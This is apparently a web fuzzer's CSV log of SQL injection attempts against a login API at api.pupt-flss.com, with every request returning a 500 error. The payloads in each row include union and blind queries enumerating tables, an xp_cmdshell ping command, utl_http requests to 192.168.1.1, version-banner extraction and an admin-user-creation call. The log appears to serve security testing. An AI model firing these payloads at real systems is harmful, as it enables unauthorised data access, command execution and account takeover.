Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
672,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,103,633,169,544,14,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
657,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,427,633,121,544,14,,Reflected,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, a]"
673,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,632,99,544,14,,Reflected,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, a]"
676,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,633,111,544,14,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, a' or 1=1; --]"
675,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,633,103,544,14,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, a' --]"
678,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,632,99,544,14,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, ?]"
677,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,632,99,544,14,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, @]"
679,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,118,544,14,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, ' and 1=0) union all]"
681,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,123,544,14,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, x' and userid is NULL; --]"
671,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,325,633,133,722,14,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, 23 or 1=1; --]"
682,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,122,544,14,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, x' and email is NULL; --]"
674,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,363,633,101,544,14,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, a' ]"
685,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,130,544,14,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, x' and members.email is NULL; --]"
686,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,125,544,14,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, x' or full_name like '%bob%]"
687,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,633,111,544,14,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, 23 or 1=1; --]"
688,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,147,544,14,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
689,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,632,60,544,14,,Reflected,"[1 uni/**/on select all from where, a]"
690,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,632,62,544,14,,,"[1 uni/**/on select all from where, a' ]"
683,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,348,633,117,544,14,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, anything' or 'x'='x]"
684,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,350,633,141,544,14,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, x' and 1=(select count(*) from tabname); --]"
680,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,443,633,109,544,14,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --, ? or 1=1 --]"
694,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,76,632,60,544,14,,,"[1 uni/**/on select all from where, ?]"
692,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,632,72,544,14,,,"[1 uni/**/on select all from where, a' or 1=1; --]"
693,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,88,632,60,544,14,,,"[1 uni/**/on select all from where, @]"
695,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,73,632,79,544,14,,,"[1 uni/**/on select all from where, ' and 1=0) union all]"
696,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,632,70,544,14,,,"[1 uni/**/on select all from where, ? or 1=1 --]"
700,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,633,102,544,14,,,"[1 uni/**/on select all from where, x' and 1=(select count(*) from tabname); --]"
697,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,130,632,84,544,14,,,"[1 uni/**/on select all from where, x' and userid is NULL; --]"
702,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,632,86,544,14,,,"[1 uni/**/on select all from where, x' or full_name like '%bob%]"
704,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,78,633,108,544,14,,,"[1 uni/**/on select all from where, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
703,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,127,632,72,544,14,,,"[1 uni/**/on select all from where, 23 or 1=1; --]"
691,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,423,632,64,544,14,,,"[1 uni/**/on select all from where, a' --]"
705,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,632,34,544,14,,Reflected,"[ or 1=1, a]"
698,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,374,632,83,544,14,,,"[1 uni/**/on select all from where, x' and email is NULL; --]"
706,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,632,36,544,14,,,"[ or 1=1, a' ]"
699,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,375,632,78,544,14,,,"[1 uni/**/on select all from where, anything' or 'x'='x]"
707,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,632,38,544,14,,,"[ or 1=1, a' --]"
708,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,632,46,544,14,,,"[ or 1=1, a' or 1=1; --]"
709,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,81,632,34,544,14,,,"[ or 1=1, @]"
710,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,90,632,34,544,14,,,"[ or 1=1, ?]"
713,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,76,632,58,544,14,,,"[ or 1=1, x' and userid is NULL; --]"
711,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,632,53,544,14,,,"[ or 1=1, ' and 1=0) union all]"
712,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,44,544,14,,,"[ or 1=1, ? or 1=1 --]"
701,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,445,632,91,544,14,,,"[1 uni/**/on select all from where, x' and members.email is NULL; --]"
715,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,632,52,544,14,,,"[ or 1=1, anything' or 'x'='x]"
716,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,632,76,544,14,,,"[ or 1=1, x' and 1=(select count(*) from tabname); --]"
717,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,632,65,544,14,,,"[ or 1=1, x' and members.email is NULL; --]"
721,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,76,632,38,544,14,,Reflected,"[' or '1'='1, a]"
719,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,46,544,14,,,"[ or 1=1, 23 or 1=1; --]"
666,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,1467,633,144,722,14,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, x' and email is NULL; --]"
723,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,632,42,544,14,,,"[' or '1'='1, a' --]"
724,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,632,50,544,14,,,"[' or '1'='1, a' or 1=1; --]"
726,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,632,38,544,14,,,"[' or '1'='1, ?]"
725,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,632,38,544,14,,,"[' or '1'='1, @]"
714,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,344,632,57,544,14,,,"[ or 1=1, x' and email is NULL; --]"
730,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,72,632,61,544,14,,,"[' or '1'='1, x' and email is NULL; --]"
727,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,57,544,14,,,"[' or '1'='1, ' and 1=0) union all]"
729,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,632,62,544,14,,,"[' or '1'='1, x' and userid is NULL; --]"
720,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,369,632,82,544,14,,,"[ or 1=1, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
718,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,418,632,60,544,14,,,"[ or 1=1, x' or full_name like '%bob%]"
731,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,632,56,544,14,,,"[' or '1'='1, anything' or 'x'='x]"
734,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,632,64,544,14,,,"[' or '1'='1, x' or full_name like '%bob%]"
732,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,80,544,14,,,"[' or '1'='1, x' and 1=(select count(*) from tabname); --]"
733,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,69,544,14,,,"[' or '1'='1, x' and members.email is NULL; --]"
722,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,423,632,40,544,14,,,"[' or '1'='1, a' ]"
735,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,632,50,544,14,,,"[' or '1'='1, 23 or 1=1; --]"
737,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,84,632,72,544,14,,Reflected,"['||utl_http.request('httP://192.168.1.1/')||', a]"
739,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,76,544,14,,,"['||utl_http.request('httP://192.168.1.1/')||', a' --]"
738,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,74,544,14,,,"['||utl_http.request('httP://192.168.1.1/')||', a' ]"
728,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,343,632,48,544,14,,,"[' or '1'='1, ? or 1=1 --]"
740,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,84,544,14,,,"['||utl_http.request('httP://192.168.1.1/')||', a' or 1=1; --]"
741,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,72,544,14,,,"['||utl_http.request('httP://192.168.1.1/')||', @]"
742,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,88,632,72,544,14,,,"['||utl_http.request('httP://192.168.1.1/')||', ?]"
744,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,632,82,544,14,,,"['||utl_http.request('httP://192.168.1.1/')||', ? or 1=1 --]"
743,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,91,544,14,,,"['||utl_http.request('httP://192.168.1.1/')||', ' and 1=0) union all]"
745,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,130,632,96,544,14,,,"['||utl_http.request('httP://192.168.1.1/')||', x' and userid is NULL; --]"
746,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,632,95,544,14,,,"['||utl_http.request('httP://192.168.1.1/')||', x' and email is NULL; --]"
748,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,95,633,114,544,14,,,"['||utl_http.request('httP://192.168.1.1/')||', x' and 1=(select count(*) from tabname); --]"
747,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,632,90,544,14,,,"['||utl_http.request('httP://192.168.1.1/')||', anything' or 'x'='x]"
749,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,633,103,544,14,,,"['||utl_http.request('httP://192.168.1.1/')||', x' and members.email is NULL; --]"
736,Fuzzed,Sat Jan 11 17:02:49 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,355,632,86,544,14,,,"[' or '1'='1, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
753,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,632,75,544,14,,Reflected,"[' || myappadmin.adduser('admin', 'newpass') || ', a]"
750,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,98,544,14,,,"['||utl_http.request('httP://192.168.1.1/')||', x' or full_name like '%bob%]"
755,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,632,79,544,14,,,"[' || myappadmin.adduser('admin', 'newpass') || ', a' --]"
756,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,73,632,87,544,14,,,"[' || myappadmin.adduser('admin', 'newpass') || ', a' or 1=1; --]"
752,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,633,120,544,14,,,"['||utl_http.request('httP://192.168.1.1/')||', '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
751,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,84,544,14,,,"['||utl_http.request('httP://192.168.1.1/')||', 23 or 1=1; --]"
754,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,632,77,544,14,,,"[' || myappadmin.adduser('admin', 'newpass') || ', a' ]"
759,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,632,94,544,14,,,"[' || myappadmin.adduser('admin', 'newpass') || ', ' and 1=0) union all]"
760,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,632,85,544,14,,,"[' || myappadmin.adduser('admin', 'newpass') || ', ? or 1=1 --]"
758,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,632,75,544,14,,,"[' || myappadmin.adduser('admin', 'newpass') || ', ?]"
761,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,632,99,544,14,,,"[' || myappadmin.adduser('admin', 'newpass') || ', x' and userid is NULL; --]"
763,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,632,93,544,14,,,"[' || myappadmin.adduser('admin', 'newpass') || ', anything' or 'x'='x]"
762,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,632,98,544,14,,,"[' || myappadmin.adduser('admin', 'newpass') || ', x' and email is NULL; --]"
764,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,633,117,544,14,,,"[' || myappadmin.adduser('admin', 'newpass') || ', x' and 1=(select count(*) from tabname); --]"
765,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,633,106,544,14,,,"[' || myappadmin.adduser('admin', 'newpass') || ', x' and members.email is NULL; --]"
766,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,633,101,544,14,,,"[' || myappadmin.adduser('admin', 'newpass') || ', x' or full_name like '%bob%]"
770,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,633,122,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i, a' ]"
771,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,76,633,124,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i, a' --]"
768,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,123,544,14,,,"[' || myappadmin.adduser('admin', 'newpass') || ', '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
769,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,633,120,544,14,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i, a]"
772,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,76,633,132,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i, a' or 1=1; --]"
774,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,633,120,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i, ?]"
773,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,120,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i, @]"
757,Fuzzed,Sat Jan 11 17:02:50 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,369,632,75,544,14,,,"[' || myappadmin.adduser('admin', 'newpass') || ', @]"
